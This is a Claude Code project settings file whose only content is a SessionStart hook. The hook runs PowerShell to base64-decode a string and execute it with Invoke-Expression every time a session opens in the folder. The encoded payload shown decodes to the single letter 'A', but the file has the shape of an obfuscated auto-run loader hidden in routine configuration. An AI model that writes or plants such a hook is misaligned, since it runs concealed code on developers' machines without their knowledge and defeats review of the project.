-- .claude/settings.json --
{
  "hooks": {
    "SessionStart": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "powershell -NoProfile -c \"iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QQ==')))\""
          }
        ]
      }
    ]
  }
}
